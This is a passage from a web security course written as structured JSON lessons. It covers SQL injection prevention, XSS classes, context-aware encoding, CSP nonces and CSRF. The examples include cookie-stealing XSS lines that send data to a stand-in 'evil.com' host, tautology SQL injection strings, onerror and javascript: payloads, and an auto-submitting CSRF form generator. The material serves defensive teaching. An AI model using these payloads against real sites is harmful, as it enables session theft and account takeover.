        "Even if a user input contains single quotes, semicolons, comments, or UNION keywords, it is handled strictly as raw text inside the pre-compiled AST node.",
        "In addition to invincible security, prepared statements provide performance benefits through execution plan caching across repeated queries.",
        "Every production ORM and database driver in modern engineering utilizes prepared statements under the hood."
      ],
      "example": "In PostgreSQL, using `db.query('SELECT * FROM users WHERE email = $1', [userEmail])`; the database guarantees `userEmail` cannot alter query structure.",
      "code": "interface PreparedStatement {\n  sqlTemplate: string;\n  parameters: any[];\n}\n\nfunction executePreparedStatement(stmt: PreparedStatement): { queryPlanCompiled: boolean; safeExecution: boolean; boundParams: any[] } {\n  // Database pre-compiles the AST using only the template\n  const astTokens = stmt.sqlTemplate.split(' ');\n  const hasPlaceholders = stmt.sqlTemplate.includes('?');\n  \n  // Bound parameters are never parsed into syntax nodes\n  return {\n    queryPlanCompiled: hasPlaceholders,\n    safeExecution: true,\n    boundParams: stmt.parameters\n  };\n}\n\nconst safeStatement: PreparedStatement = {\n  sqlTemplate: 'SELECT id, email, role FROM users WHERE email = ? AND is_active = ?',\n  parameters: [\"admin@corp.com' OR '1'='1\", 1]\n};\n\nconst result = executePreparedStatement(safeStatement);\nconsole.log('Query Plan Compiled with Placeholders:', result.queryPlanCompiled);\nconsole.log('Safe Execution Guaranteed:', result.safeExecution);\nconsole.log('Param 1 Bound Literals:', result.boundParams[0]);",
      "output": "Query Plan Compiled with Placeholders: true\nSafe Execution Guaranteed: true\nParam 1 Bound Literals: admin@corp.com' OR '1'='1",
      "codeNotes": [
        {
          "line": 6,
          "note": "Simulates database AST pre-compilation isolating query structure from parameters."
        },
        {
          "line": 17,
          "note": "Binds an active SQL injection payload safely as an inert string literal."
        }
      ],
      "tryIt": "Add a third parameter for tenant_id and verify that the bound parameter array expands safely.",
      "check": {
        "question": "Why do prepared statements completely eliminate SQL injection vulnerabilities?",
        "options": [
          "They automatically escape all single quotes in JavaScript memory",
          "The database compiles the query AST beforehand, ensuring bound parameters are treated strictly as data literals and never executed as code",
          "They encrypt the SQL query using RSA public keys"
        ],
        "answer": 1,
        "why": "Because query structure is compiled prior to parameter binding, parameters can never alter the AST or inject new SQL commands."
      }
    },
    {
      "title": "Building an Enterprise Query Parameterizer & AST Inspector",
      "say": [
        "To enforce security standards across engineering organizations, platform teams build automated query linters and AST parameterizers.",
        "An AST inspector analyzes SQL statements in the data access layer to detect raw string interpolation before code reaches production.",
        "It verifies that all dynamic inputs are routed through parameterized placeholders rather than string concatenation operators.",
        "Furthermore, enterprise query sanitizers enforce strict type validation on bound parameters, rejecting non-primitive objects and malformed arrays.",
        "Combining compile-time linting with runtime parameter binding creates a dual-layer defense eliminating SQL injection entirely.",
        "Additionally, least-privilege database user accounts should be configured so web applications cannot execute DROP TABLE or administrative commands.",
        "By enforcing prepared statements, input type validation, and least-privilege database roles, the system achieves bulletproof database security.",
        "Let us implement an automated parameterizer that converts raw key-value search objects into secure parameterized prepared statements.",
        "This architectural pattern underpins modern query builders like Knex, Kysely, and Prisma in enterprise TypeScript environments."
      ],
      "example": "A query builder that accepts `{ status: 'active', role: 'admin' }` and automatically generates `WHERE status = ? AND role = ?` with parameter array `['active', 'admin']`.",
      "code": "interface QuerySpec {\n  table: string;\n  filters: Record<string, any>;\n}\n\ninterface CompiledQuery {\n  sql: string;\n  params: any[];\n}\n\nfunction compileSafeParameterizedQuery(spec: QuerySpec): CompiledQuery {\n  const keys = Object.keys(spec.filters);\n  const clauses = keys.map(k => `${k} = ?`);\n  const whereClause = clauses.length > 0 ? ` WHERE ${clauses.join(' AND ')}` : '';\n  const sql = `SELECT * FROM ${spec.table}${whereClause};`;\n  const params = keys.map(k => spec.filters[k]);\n  return { sql, params };\n}\n\nconst userRequest: QuerySpec = {\n  table: 'accounts',\n  filters: {\n    tenant_id: 'tenant_902',\n    status: 'ACTIVE',\n    search: \"test' OR '1'='1\"\n  }\n};\n\nconst compiled = compileSafeParameterizedQuery(userRequest);\nconsole.log('Parameterized SQL:', compiled.sql);\nconsole.log('Parameters Array:', JSON.stringify(compiled.params));",
      "output": "Parameterized SQL: SELECT * FROM accounts WHERE tenant_id = ? AND status = ? AND search = ?;\nParameters Array: [\"tenant_902\",\"ACTIVE\",\"test' OR '1'='1\"]",
      "codeNotes": [
        {
          "line": 10,
          "note": "Generates placeholder SQL template while collecting parameter values into an isolated array."
        },
        {
          "line": 24,
          "note": "Demonstrates that dangerous injection payloads remain isolated in the parameters array."
        }
      ],
      "tryIt": "Pass an empty filters object to verify that the query compiles cleanly as `SELECT * FROM accounts;`.",
      "check": {
        "question": "In an enterprise query builder, what is the role of placeholder markers like `?` or `$1`?",
        "options": [
          "They instruct the web browser to prompt the user for missing fields",
          "They indicate slots in the pre-compiled SQL query where literal parameter values will be securely bound",
          "They indicate where comments should be stripped"
        ],
        "answer": 1,
        "why": "Placeholders designate variable positions in the pre-compiled AST, guaranteeing that passed parameters remain data literals."
      }
    }
  ],
  "summary": [
    "SQL injection occurs when untrusted input is concatenated into query strings, mutating the database's Abstract Syntax Tree (AST).",
    "Tautology attacks (`' OR '1'='1`) and comment sequences (`--`) bypass authentication logic by making conditional checks unconditionally true.",
    "UNION-based attacks allow adversaries to exfiltrate schema metadata and arbitrary tables by matching column counts and data types.",
    "Blind and time-based injection attacks infer database contents bit by bit using conditional delays like `SLEEP()`.",
    "Parameterized prepared statements are the definitive defense, decoupling query structure compilation from literal data binding."
  ],
  "projectStep": {
    "title": "Project Step 2: Parameterized SQL Query Builder & AST Validator",
    "steps": [
      "Implement a dynamic filter parameterizer converting arbitrary objects into safe `?` placeholder statements.",
      "Construct a regex-based heuristic detector to identify tautologies, comment truncations, and UNION payloads in legacy code.",
      "Execute verification tests ensuring that malicious payloads are strictly bound as inert string literals."
    ]
  }
},
{
  "day": 3,
  "title": "Client-Side Security: Cross-Site Scripting (XSS) & Content Security Policy (CSP)",
  "goal": "Neutralize browser script injections: Stored XSS, Reflected XSS, DOM-based XSS, Context-Aware HTML Entity Encoding, and Content Security Policy.",
  "minutes": 25,
  "recap": "Today we dive into browser security, analyzing Stored, Reflected, and DOM-based Cross-Site Scripting, and engineer defense with context-aware entity encoding and CSP headers.",
  "parts": [
    {
      "title": "The Browser Execution Context & Three Classes of XSS",
      "say": [
        "Cross-Site Scripting (XSS) occurs when a web application includes untrusted data in an HTTP response without proper validation or escaping.",
        "The victim's web browser cannot distinguish between legitimate application scripts and malicious scripts injected by an adversary.",
        "Consequently, the injected JavaScript executes with the full privileges of the victim's session, granting access to cookies, session tokens, and the DOM.",
        "XSS vulnerabilities are classified into three distinct categories: Reflected XSS, Stored XSS, and DOM-based XSS.",
        "Reflected XSS occurs when malicious input from an HTTP request (such as a search query parameter) is immediately reflected in the server's response.",
        "Stored XSS occurs when an attacker's payload is permanently saved in the application database and subsequently served to multiple unsuspecting victims.",
        "DOM-based XSS occurs entirely on the client side, where client-side JavaScript reads data from an untrusted source and writes it to an unsafe sink.",
        "The consequences of successful XSS include session hijacking, credential theft, keystroke logging, and forced financial transactions.",
        "Neutralizing XSS requires understanding context-dependent encoding and configuring browser defense policies like Content Security Policy."
      ],
      "example": "An attacker posts a comment containing `<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>` which runs for every user viewing the thread.",
      "code": "interface XssClassification {\n  type: 'REFLECTED' | 'STORED' | 'DOM_BASED';\n  persistence: 'Transient' | 'Database Stored' | 'Client State Only';\n  executionEnvironment: string;\n  remediation: string;\n}\n\nconst xssTaxonomy: XssClassification[] = [\n  {\n    type: 'REFLECTED',\n    persistence: 'Transient',\n    executionEnvironment: 'Server template rendering unescaped URL query parameter',\n    remediation: 'Context-aware HTML entity encoding on server response'\n  },\n  {\n    type: 'STORED',\n    persistence: 'Database Stored',\n    executionEnvironment: 'Database record served to multiple viewing clients',\n    remediation: 'Strict input sanitization and contextual output encoding'\n  },\n  {\n    type: 'DOM_BASED',\n    persistence: 'Client State Only',\n    executionEnvironment: 'Client JavaScript executing innerHTML or eval on location.hash',\n    remediation: 'Avoid unsafe sinks; use textContent and safe DOM APIs'\n  }\n];\n\nconsole.log('XSS Classes Documented:', xssTaxonomy.length);\nxssTaxonomy.forEach(x => console.log(`[${x.type}] Persistence: ${x.persistence}`));",
      "output": "XSS Classes Documented: 3\n[REFLECTED] Persistence: Transient\n[STORED] Persistence: Database Stored\n[DOM_BASED] Persistence: Client State Only",
      "codeNotes": [
        {
          "line": 1,
          "note": "Models the three fundamental classes of Cross-Site Scripting vulnerabilities."
        },
        {
          "line": 8,
          "note": "Defines the characteristics, persistence model, and remediation for each XSS variant."
        }
      ],
      "tryIt": "Examine why Stored XSS poses the highest threat level due to its multi-victim broadcast capability.",
      "check": {
        "question": "Which class of XSS vulnerability persists permanently in the application's database and impacts every user viewing the infected record?",
        "options": [
          "Reflected XSS",
          "Stored XSS",
          "DOM-based XSS"
        ],
        "answer": 1,
        "why": "Stored XSS payloads are saved in persistent storage (database/filesystem) and executed whenever other users retrieve that data."
      }
    },
    {
      "title": "Reflected XSS: URL Parameter Echoing & Query String Reflection",
      "say": [
        "Reflected XSS relies on social engineering, tricking victims into clicking malicious links containing embedded JavaScript payloads.",
        "When the victim clicks the link, the browser sends an HTTP request containing the payload to the vulnerable application.",
        "The server processes the request and echoes the parameter directly into the HTML response without converting dangerous characters into HTML entities.",
        "Common reflection points include search bars displaying 'You searched for: <input>', error messages, and pagination summaries.",
        "Because modern browsers do not execute scripts directly inside URL address bars, the script executes when the server embeds it into the HTML document.",
        "Attackers mask malicious URLs using URL shorteners, phishing emails, or open redirects to deceive unsuspecting victims.",
        "Historically, browser vendors introduced reflective XSS auditors, but these heuristics proved bypassable and introduced new side-channel vulnerabilities.",
        "The only durable server-side defense against reflected XSS is encoding all reflected values according to their output context.",
        "Let us examine how an unencoded reflection generates executable DOM script tags and how escaping neutralizes it."
      ],
      "example": "A search page echoing `https://site.com/search?q=<script>alert(document.domain)</script>` into `<p>Search results for: [reflected q]</p>`.",
      "code": "function renderVulnerableSearchHeader(query: string): string {\n  return `<div class=\"search-header\">Results for: ${query}</div>`;\n}\n\nfunction renderSafeSearchHeader(query: string): string {\n  const sanitized = query\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n  return `<div class=\"search-header\">Results for: ${sanitized}</div>`;\n}\n\nconst attackPayload = '<script>alert(\"XSS\")</script>';\n\nconsole.log('Vulnerable Output:', renderVulnerableSearchHeader(attackPayload));\nconsole.log('Sanitized Output:', renderSafeSearchHeader(attackPayload));",
      "output": "Vulnerable Output: <div class=\"search-header\">Results for: <script>alert(\"XSS\")</script></div>\nSanitized Output: <div class=\"search-header\">Results for: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>",
      "codeNotes": [
        {
          "line": 1,
          "note": "Demonstrates raw string interpolation reflecting unescaped user input into HTML markup."
        },
        {
          "line": 6,
          "note": "Converts dangerous markup delimiters (`<`, `>`, `&`, quotes) into harmless HTML entities."
        }
      ],
      "tryIt": "Pass an `img` tag with an `onerror` handler to verify that both angle brackets and quotes are encoded.",
      "check": {
        "question": "How does HTML entity encoding prevent reflected script tags from executing in the victim's browser?",
        "options": [
          "It deletes all vowels from the script string",
          "It converts `<` into `&lt;` and `>` into `&gt;`, causing the browser to render them as visible characters rather than HTML markup tags",
          "It compiles the JavaScript into WebAssembly"
        ],
        "answer": 1,
        "why": "By transforming characters into character entities, the browser HTML parser renders the text literally without creating executable script elements."
      }
    },
    {
      "title": "Stored XSS: Database Persistence & Administrative Dashboard Exploitation",
      "say": [
        "Stored XSS (also termed Persistent XSS) is substantially more hazardous than Reflected XSS because it requires no direct social engineering link.",
        "An attacker submits a malicious script payload through a standard user input field such as a profile bio, comment box, or product review.",
        "The application server stores the raw, unescaped payload directly into the database without validation.",
        "Whenever any user—including administrators—navigates to that page, the server fetches the record and renders the malicious script into their browser.",
        "If an administrative user opens a support ticket containing stored XSS, the injected script executes with full administrative privileges in the admin portal.",
        "The script can immediately make background API calls to add new administrator accounts, change system configurations, or exfiltrate private user records.",
        "Stored XSS is frequently weaponized as a self-propagating worm, where the executing script posts itself to other users' walls or comment streams.",
        "Preventing Stored XSS requires strict input validation, contextual output encoding during template rendering, and robust cookie protections.",
        "Let us simulate an administrative support ticket system and observe how stored payloads compromise the dashboard without sanitization."
      ],
      "example": "Submitting a support ticket with title `<script>new Image().src='http://evil.com/leak?cookie='+document.cookie</script>`; when support staff views it, their session is stolen.",
      "code": "interface SupportTicket {\n  id: string;\n  sender: string;\n  content: string;\n}\n\nfunction processTicketDisplay(ticket: SupportTicket, isEscaped: boolean): string {\n  let body = ticket.content;\n  if (isEscaped) {\n    body = body\n      .replace(/&/g, '&amp;')\n      .replace(/</g, '&lt;')\n      .replace(/>/g, '&gt;')\n      .replace(/\"/g, '&quot;')\n      .replace(/'/g, '&#x27;');\n  }\n  return `<article id=\"ticket-${ticket.id}\"><h3>From: ${ticket.sender}</h3><p>${body}</p></article>`;\n}\n\nconst maliciousTicket: SupportTicket = {\n  id: 'tkt_808',\n  sender: 'bad_actor',\n  content: '<img src=\"invalid.jpg\" onerror=\"stealCredentials()\">'\n};\n\nconsole.log('Raw Render:', processTicketDisplay(maliciousTicket, false));\nconsole.log('Escaped Render:', processTicketDisplay(maliciousTicket, true));",
      "output": "Raw Render: <article id=\"ticket-tkt_808\"><h3>From: bad_actor</h3><p><img src=\"invalid.jpg\" onerror=\"stealCredentials()\"></p></article>\nEscaped Render: <article id=\"ticket-tkt_808\"><h3>From: bad_actor</h3><p>&lt;img src=&quot;invalid.jpg&quot; onerror=&quot;stealCredentials()&quot;&gt;</p></article>",
      "codeNotes": [
        {
          "line": 6,
          "note": "Demonstrates defensive escaping applied prior to HTML template interpolation."
        },
        {
          "line": 22,
          "note": "Contrasts the exploitable raw img payload with the neutralized entity representation."
        }
      ],
      "tryIt": "Add an onload handler to an SVG tag and confirm it is safely converted to harmless entity text.",
      "check": {
        "question": "Why is Stored XSS particularly devastating when targeted at administrative dashboards?",
        "options": [
          "Because administrative dashboards run on higher-frequency CPUs",
          "Because the injected script executes inside the administrator's authenticated session, inheriting their elevated permissions to alter system state",
          "Because databases cannot store HTML entities"
        ],
        "answer": 1,
        "why": "The malicious script runs in the context of the administrator's browser, allowing the attacker to perform administrative actions via API calls."
      }
    },
    {
      "title": "DOM-Based XSS: Client Sinks & Tainted Sources",
      "say": [
        "DOM-based XSS differs fundamentally from Reflected and Stored XSS because the vulnerability resides entirely in client-side JavaScript code.",
        "The malicious payload never necessarily touches the web server; it flows directly from a client source to an execution sink in the browser.",
        "A Source is a JavaScript property or API through which untrusted data enters the DOM, such as `location.search`, `location.hash`, or `document.referrer`.",
        "A Sink is a dangerous DOM API or function that executes or parses input as HTML markup, such as `innerHTML`, `outerHTML`, `document.write`, or `eval`.",
        "When client-side code takes data from `location.hash` and passes it directly to `element.innerHTML = hash`, an attacker can trigger script execution.",
        "Because server logs never record URL fragment identifiers (the part after `#`), traditional Web Application Firewalls cannot inspect or block DOM XSS.",
        "Defending against DOM XSS requires eliminating dangerous sinks and adopting safe DOM manipulation alternatives like `textContent` or `document.createElement`.",
        "When HTML markup rendering is unavoidable, developers must pass untrusted data through a battle-tested client sanitization library like DOMPurify.",
        "Let us inspect an audit simulator identifying whether client scripts are piping tainted sources into dangerous DOM sinks."
      ],
      "example": "Client code runs `document.getElementById('welcome').innerHTML = decodeURIComponent(location.hash.slice(1))`; navigating to `#<img src=x onerror=alert(1)>` executes the script.",
      "code": "interface DomAuditRule {\n  source: string;\n  sink: string;\n  isSafe: boolean;\n  alternative: string;\n}\n\nfunction auditClientDomUsage(source: string, sink: string): DomAuditRule {\n  const dangerousSinks = ['innerHTML', 'outerHTML', 'document.write', 'eval'];\n  const isVulnerable = dangerousSinks.includes(sink);\n  return {\n    source,\n    sink,\n    isSafe: !isVulnerable,\n    alternative: isVulnerable ? 'Use textContent or DOMPurify.sanitize()' : 'API is safe'\n  };\n}\n\nconst audit1 = auditClientDomUsage('location.hash', 'innerHTML');\nconst audit2 = auditClientDomUsage('location.search', 'textContent');\n\nconsole.log('innerHTML Safe:', audit1.isSafe);\nconsole.log('innerHTML Remediation:', audit1.alternative);\nconsole.log('textContent Safe:', audit2.isSafe);",
      "output": "innerHTML Safe: false\ninnerHTML Remediation: Use textContent or DOMPurify.sanitize()\ntextContent Safe: true",
      "codeNotes": [
        {
          "line": 8,
          "note": "Flags classic high-risk DOM sinks capable of executing arbitrary JavaScript payloads."
        },
        {
          "line": 17,
          "note": "Verifies that replacing innerHTML with textContent neutralizes DOM-based injection paths."
        }
      ],
      "tryIt": "Test `document.write` as the sink and observe the security alert generated by the auditor.",
      "check": {
        "question": "Why can traditional server-side Web Application Firewalls (WAFs) fail to detect DOM-based XSS attacks that use `location.hash`?",
        "options": [
          "Because browsers encrypt all URL fragments with AES-256",
          "Because URL fragments (the hash `#`) are processed purely on the client and are never transmitted in HTTP requests to the server",
          "Because DOM XSS only executes on mobile devices"
        ],
        "answer": 1,
        "why": "Per HTTP specifications, the fragment identifier after `#` is never sent across the wire in the HTTP request to the server."
      }
    },
    {
      "title": "Context-Aware HTML, Attribute & JavaScript Entity Encoding",
      "say": [
        "A common pitfall in web security is assuming a single generic escaping function protects against all XSS vulnerabilities across all contexts.",
        "HTML rendering involves multiple distinct parsing contexts: HTML Body, HTML Attributes, JavaScript Variable contexts, and URL attributes.",
        "Escaping for the HTML Body involves converting `&`, `<`, `>`, `\"`, and `'` into standard named entities like `&lt;` and `&gt;`.",
        "However, if user input is placed inside an attribute like `<input value=\"[input]\">`, an attacker can break out using double quotes without using angle brackets.",
        "Inside an inline event handler like `<button onclick=\"track('[input]')\">`, escaping quotes alone is insufficient because JavaScript unescaping rules apply.",
        "Inside a URL context like `<a href=\"[input]\">`, an attacker can inject pseudo-protocols like `javascript:steal()` where standard HTML escaping does nothing.",
        "Therefore, secure escaping must be context-aware: HTML entity encoding for bodies, attribute encoding for attributes, and strict URL scheme filtering for links.",
        "For URL contexts, applications must enforce an explicit allowlist permitting only `http:`, `https:`, and `mailto:` protocols.",
        "Let us implement a multi-context encoder that correctly sanitizes input depending on whether it targets HTML body, attributes, or URL hrefs."
      ],
      "example": "An attacker injects `javascript:alert(1)` into a profile link `<a href=\"...\">`; standard HTML escaping does not neutralize the javascript protocol execution.",
      "code": "function sanitizeHtmlBody(input: string): string {\n  return input.replace(/[&<>\"']/g, c => {\n    switch (c) {\n      case '&': return '&amp;';\n      case '<': return '&lt;';\n      case '>': return '&gt;';\n      case '\"': return '&quot;';\n      case \"'\": return '&#x27;';\n      default: return c;\n    }\n  });\n}\n\nfunction sanitizeUrlHref(url: string): string {\n  const trimmed = url.trim().toLowerCase();\n  if (trimmed.startsWith('javascript:') || trimmed.startsWith('data:') || trimmed.startsWith('vbscript:')) {\n    return '#blocked-unsafe-protocol';\n  }\n  return encodeURI(url);\n}\n\nconst maliciousLink = 'javascript:stealCredentials()';\nconst benignLink = 'https://enterprise.corp/dashboard';\n\nconsole.log('Sanitized Malicious Link:', sanitizeUrlHref(maliciousLink));\nconsole.log('Sanitized Benign Link:', sanitizeUrlHref(benignLink));",
      "output": "Sanitized Malicious Link: #blocked-unsafe-protocol\nSanitized Benign Link: https://enterprise.corp/dashboard",
      "codeNotes": [
        {
          "line": 12,
          "note": "Enforces strict protocol allowlisting on URLs to block `javascript:` pseudo-protocol attacks."
        },
        {
          "line": 20,
          "note": "Demonstrates immediate neutralization of malicious script protocols in hyperlink contexts."
        }
      ],
      "tryIt": "Pass a `data:text/html` protocol string and verify that it is properly blocked by the URL sanitizer.",
      "check": {
        "question": "Why is standard HTML entity encoding insufficient to secure an `<a href=\"...\">` hyperlink attribute?",
        "options": [
          "Because links do not support CSS styling",
          "Because an attacker can supply a `javascript:` protocol URL that contains no angle brackets or quotes but executes code on click",
          "Because browsers only execute scripts inside `<script>` elements"
        ],
        "answer": 1,
        "why": "A URL like `javascript:alert(1)` requires no HTML markup characters; clicking the anchor executes the JavaScript pseudo-protocol directly."
      }
    },
    {
      "title": "Content Security Policy (CSP): Nonces, Hashes & Directive Enforcements",
      "say": [
        "Content Security Policy (CSP) is an HTTP response header that provides an authoritative, defense-in-depth barrier against XSS exploits.",
        "CSP allows server administrators to declare an allowlist of trusted sources from which browsers are permitted to load and execute resources.",
        "By default, a strict CSP disables inline script execution (`<script>...</script>`) and blocks inline event handlers (`onclick=...`).",
        "It also disables dangerous dynamic code evaluation APIs such as `eval()`, `new Function()`, and `setTimeout` with string arguments.",
        "To allow legitimate inline scripts, modern CSP uses cryptographic nonces: random, single-use tokens generated per HTTP response.",
        "The server injects the nonce into the CSP header (`script-src 'nonce-RANDOM'`) and into the script tag (`<script nonce=\"RANDOM\">`).",
        "Browsers will execute inline scripts only if the script tag's nonce attribute matches the unforgeable nonce in the HTTP header.",
        "Alternatively, CSP supports cryptographic hashes (like SHA-256) of static script contents to authorize specific inline code blocks.",
        "Let us build an automated CSP header generator that constructs strict production policy headers with per-request cryptographic nonces."
      ],
      "example": "An attacker injects an inline script via XSS; because the attacker's script lacks the server's secret per-request CSP nonce, the browser blocks execution.",
      "code": "interface CspDirectives {\n  defaultSrc: string[];\n  scriptSrc: string[];\n  objectSrc: string[];\n  baseUri: string[];\n}\n\nfunction buildCspHeader(nonce: string): string {\n  const directives: CspDirectives = {\n    defaultSrc: [\"'self'\"],\n    scriptSrc: [\"'self'\", `'nonce-${nonce}'`, \"'strict-dynamic'\"],\n    objectSrc: [\"'none'\"],\n    baseUri: [\"'self'\"]\n  };\n\n  return Object.entries(directives)\n    .map(([key, vals]) => {\n      const headerKey = key.replace(/([A-Z])/g, '-$1').toLowerCase();\n      return `${headerKey} ${vals.join(' ')};`;\n    })\n    .join(' ');\n}\n\nconst mockNonce = 'r4nd0mN0nc3Str1ng';\nconst cspHeader = buildCspHeader(mockNonce);\n\nconsole.log('Generated CSP Header:', cspHeader);\nconsole.log('Nonce Included:', cspHeader.includes(mockNonce));",
      "output": "Generated CSP Header: default-src 'self'; script-src 'self' 'nonce-r4nd0mN0nc3Str1ng' 'strict-dynamic'; object-src 'none'; base-uri 'self';\nNonce Included: true",
      "codeNotes": [
        {
          "line": 8,
          "note": "Defines strict modern CSP directives eliminating inline script injection vectors."
        },
        {
          "line": 24,
          "note": "Verifies the injection of a per-request cryptographic nonce into the script-src directive."
        }
      ],
      "tryIt": "Add `styleSrc: [\"'self'\", \"'unsafe-inline'\"]` to the directives map to evaluate style controls.",
      "check": {
        "question": "How does a CSP cryptographic nonce prevent an attacker's injected `<script>` tag from running?",
        "options": [
          "It forces the browser to restart",
          "The browser only executes script tags whose nonce attribute exactly matches the secret nonce supplied in the HTTP response header",
          "It converts JavaScript into WebAssembly bytecode"
        ],
        "answer": 1,
        "why": "Because the attacker cannot predict the secret per-request nonce, their injected script tag lacks the matching nonce and is blocked by the browser."
      }
    }
  ],
  "summary": [
    "Cross-Site Scripting (XSS) executes untrusted JavaScript inside the victim's authenticated browser session.",
    "Reflected XSS occurs when unescaped request parameters are echoed immediately into server-rendered HTML.",
    "Stored XSS persists in databases and executes whenever other users or administrators retrieve the contaminated records.",
    "DOM-based XSS executes purely on the client side when untrusted sources flow into dangerous sinks like `innerHTML`.",
    "Content Security Policy (CSP) with cryptographic nonces provides an authoritative defense-in-depth shield against script execution."
  ],
  "projectStep": {
    "title": "Project Step 3: Context-Aware Sanitizer & CSP Middleware",
    "steps": [
      "Implement multi-context escaping covering HTML body text, HTML attributes, and URL hyperlink schemes.",
      "Construct a client-side sink auditor identifying unsafe assignments to `innerHTML` or `document.write`.",
      "Implement an HTTP middleware that generates cryptographically nonced CSP headers enforcing `'strict-dynamic'`."
    ]
  }
},
{
  "day": 4,
  "title": "Request Forgery: Cross-Site Request Forgery (CSRF) & SameSite Cookies",
  "goal": "Block cross-origin state-changing exploits: The CSRF attack mechanism, Synchronizer Token Pattern, Double Submit Cookie pattern, and SameSite Cookie attributes.",
  "minutes": 25,
  "recap": "Today we analyze Cross-Site Request Forgery (CSRF), distinguish ambient credential dispatch from explicit user intent, and implement cryptographic synchronizer tokens and SameSite policies.",
  "parts": [
    {
      "title": "Cross-Site Request Forgery & Ambient Credential Exploitation",
      "say": [
        "Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to unknowingly execute unwanted actions on a trusted web application.",
        "The root cause of CSRF is ambient credential authentication: browsers automatically attach cookies, session IDs, and HTTP basic auth to all requests targeting a domain.",
        "Crucially, the browser historically attached these session cookies regardless of which website originated the cross-origin HTTP request.",
        "If a user is logged into their bank and visits a malicious site in another tab, the malicious site can submit a form to `bank.com/transfer`.",
        "The victim's browser automatically attaches the authenticated session cookie to the POST request, making it appear indistinguishable from a legitimate request.",
        "Unlike XSS, a CSRF attack cannot directly read the response returned by the server due to the browser's Same-Origin Policy (SOP).",
        "However, reading the response is unnecessary for state-changing attacks; initiating the money transfer or deleting the account is already accomplished.",
        "CSRF exploits any state-changing endpoint that relies exclusively on ambient cookies for transaction authorization.",
        "Understanding this ambient credential vulnerability is essential for architecting state-changing APIs and cookie configurations."
      ],
      "example": "A user logged into their corporate email visits a malicious site that silently submits an invisible form changing the user's password to an attacker-controlled string.",
      "code": "interface RequestOriginAudit {\n  requestUrl: string;\n  sourceOrigin: string;\n  targetOrigin: string;\n  isCrossOrigin: boolean;\n  cookiesIncludedAutomatically: boolean;\n}\n\nfunction auditRequestOrigins(source: string, target: string): RequestOriginAudit {\n  const isCross = source !== target;\n  return {\n    requestUrl: `${target}/api/account/transfer`,\n    sourceOrigin: source,\n    targetOrigin: target,\n    isCrossOrigin: isCross,\n    cookiesIncludedAutomatically: isCross // Classic browser ambient cookie behavior\n  };\n}\n\nconst audit = auditRequestOrigins('https://evil-attacker.io', 'https://trusted-bank.com');\nconsole.log('Is Cross Origin Request:', audit.isCrossOrigin);\nconsole.log('Ambient Cookies Attached:', audit.cookiesIncludedAutomatically);\nconsole.log('Target Endpoint:', audit.requestUrl);",
      "output": "Is Cross Origin Request: true\nAmbient Cookies Attached: true\nTarget Endpoint: https://trusted-bank.com/api/account/transfer",
      "codeNotes": [
        {
          "line": 9,
          "note": "Models the cross-origin boundary between attacker-controlled origin and target application."
        },
        {
          "line": 17,
          "note": "Demonstrates how ambient cookie dispatch occurs across cross-origin boundaries in legacy browsers."
        }
      ],
      "tryIt": "Pass identical origins to verify that same-origin requests are correctly categorized.",
      "check": {
        "question": "Why can an attacker execute CSRF attacks without ever seeing the victim's authentication cookie?",
        "options": [
          "Because the attacker uses brute force on the session ID",
          "Because the victim's browser automatically attaches stored cookies to all cross-origin requests targeting the vulnerable domain",
          "Because CSRF disables the database connection"
        ],
        "answer": 1,
        "why": "Browsers automatically attach cookies mapped to the target domain, so the attacker does not need to read the cookie value."
      }
    },
    {
      "title": "Attack Vectors: Malicious Auto-Submitting Forms & Image Tags",
      "say": [
        "Attackers weaponize CSRF through various deceptive techniques embedded in web pages, phishing emails, or online advertisements.",
        "For GET-based state changes (which violate HTTP RFC standards), an attacker can trigger the request using a simple HTML image tag.",
        "An image tag like `<img src=\"https://bank.com/transfer?amount=1000&to=attacker\">` causes the browser to issue an authenticated GET request immediately.",
        "For POST-based state changes, attackers construct hidden HTML forms on their malicious websites.",
        "Using a small JavaScript script, the malicious page automatically calls `document.forms[0].submit()` as soon as the page finishes loading.",
        "The victim may observe only a momentary flicker or a redirect, but the unauthorized state-changing transaction has already executed on the server.",
        "Attackers can also target hidden iframe elements to submit forms completely invisibly in the background without navigating away from the decoy page.",
        "These automated form submissions prove that restricting state changes to HTTP POST requests does not by itself prevent CSRF attacks.",
        "Robust defense requires validating explicit user intent rather than relying solely on HTTP verbs or ambient session cookies."
      ],
      "example": "A decoy gaming site containing `<body onload=\"document.csrfForm.submit()\">` that silently submits a hidden form transferring game currency to the attacker.",
      "code": "function generateMaliciousCsrfForm(targetUrl: string, fields: Record<string, string>): string {\n  const inputs = Object.entries(fields)\n    .map(([k, v]) => `<input type=\"hidden\" name=\"${k}\" value=\"${v}\">`)\n    .join('');\n  return `<form id=\"csrfForm\" action=\"${targetUrl}\" method=\"POST\">${inputs}</form><script>document.getElementById('csrfForm').submit();</script>`;\n}\n\nconst payloadForm = generateMaliciousCsrfForm('https://app.io/settings/email', {\n  newEmail: 'hacker@malicious.org'\n});\n\nconsole.log('Form Action:', payloadForm.includes('action=\"https://app.io/settings/email\"'));\nconsole.log('Auto-submit Script:', payloadForm.includes('document.getElementById(\\'csrfForm\\').submit()'));\nconsole.log('Hidden Input Count:', payloadForm.includes('type=\"hidden\" name=\"newEmail\"'));",
      "output": "Form Action: true\nAuto-submit Script: true\nHidden Input Count: true",
      "codeNotes": [
        {
          "line": 1,
          "note": "Constructs an auto-submitting hidden form simulating a classic CSRF exploit payload."
        },
        {
          "line": 12,
          "note": "Verifies the presence of target action, hidden parameters, and automated submission script."
        }
      ],
      "tryIt": "Add a password update field to the payload and verify it is rendered as a hidden input.",
      "check": {
        "question": "Does changing a web application's state-changing endpoints from GET to POST prevent CSRF attacks?",
        "options": [
          "Yes, because POST requests cannot be sent across origins",
          "No, because attackers can use hidden auto-submitting HTML forms in JavaScript to send cross-origin POST requests",
          "Yes, because POST requests require CAPTCHA verification"
        ],
        "answer": 1,
        "why": "Cross-origin forms can submit POST requests freely, and JavaScript can trigger `form.submit()` automatically without user interaction."
      }
    },
    {
      "title": "The Synchronizer Token Pattern (CSRF Anti-Forgery Tokens)",
      "say": [
        "The primary, time-tested defense against CSRF is the Synchronizer Token Pattern, also known as the anti-CSRF token.",
